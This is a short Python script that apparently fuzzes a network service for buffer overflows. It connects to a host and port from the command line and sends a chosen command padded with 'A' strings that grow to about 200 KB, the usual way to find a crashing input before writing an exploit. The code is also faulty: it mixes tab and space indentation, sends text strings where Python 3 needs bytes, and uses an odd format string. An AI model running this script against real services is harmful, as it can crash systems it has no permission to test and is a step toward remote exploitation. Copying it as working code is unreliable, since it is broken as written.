
#!/usr/bin/python
import time, struct, sys
import socket as so


# Create an array of buffers, from 1 to 1000 elements, with increments of 200 bytes each.
buff=["A"]
# max number of buffers in the array
max_buffer=1000
# initial value of the counter
counter=100
# increment value
increment=200

while len(buff) <= max_buffer:
    buff.append("A"*counter)
    counter=counter+increment

for string in buff:
    try:
	cmd = sys.argv[1]
        server = sys.argv[2]
        port = int(sys.argv[3])
	print("Command :%s" % cmd)
	print("Server : %s" % server)
	print("Port : %s" % port)
	
    except IndexError:
        print("[+] Usage %s cmd + host + port " % sys.argv[0])
        sys.exit()

    print("Fuzzing with %s bytes" % len(string))
    s = so.socket(so.AF_INET, so.SOCK_STREAM)
    try:
        s.connect((server, port))
        msg1=s.recv(1024)
        print(msg1.decode("utf-8"))
        s.send("%s \.:\%s\r\n" % (cmd,string))
	s.send('exit\r\n')
        msg2=s.recv(1024)
        print(msg2.decode("utf-8"))
    except Exception as e: 
	print(e)
        sys.exit()
